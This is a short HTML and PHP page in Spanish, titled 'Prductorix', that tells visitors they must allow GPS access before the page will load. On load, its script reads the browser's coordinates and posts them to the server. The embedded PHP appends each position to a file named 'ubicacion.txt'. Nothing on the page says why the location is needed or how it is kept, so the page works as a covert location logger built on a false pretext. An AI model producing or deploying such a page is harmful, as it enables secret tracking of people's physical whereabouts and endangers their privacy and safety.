<!DOCTYPE html>
<html>
<head>
    <title>Prductorix</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(savePosition, handleError);
            } else {
                alert("La geolocalización no es compatible con este navegador.");
            }
        }

        function savePosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var locationData = "Latitud: " + latitude + ", Longitud: " + longitude;

            // Enviar los datos de ubicación al servidor
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.onreadystatechange = function() {
                if (xhttp.readyState === 4 && xhttp.status === 200) {
                    alert("GRACIAS YA PUEDE CONTINUAR.");
                }
            };
            xhttp.send("location=" + encodeURIComponent(locationData));
        }

        function handleError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("No has permitido el acceso a la ubicación.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("La información de ubicación no está disponible en este momento.");
                    break;
                case error.TIMEOUT:
                    alert("El tiempo de espera para obtener la ubicación ha expirado.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("Se ha producido un error desconocido.");
                    break;
            }
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>Solicitud En espera GPS</h1>
    <h2>Por favor, permite el acceso a tu ubicación GPS para continuar y carge la pagina.</h2>

    <?php
    if(isset($_POST['location'])) {
        $locationData = $_POST['location'];
        $file = 'ubicacion.txt';
        file_put_contents($file, $locationData . PHP_EOL, FILE_APPEND);
    }
    ?>
</body>
</html>
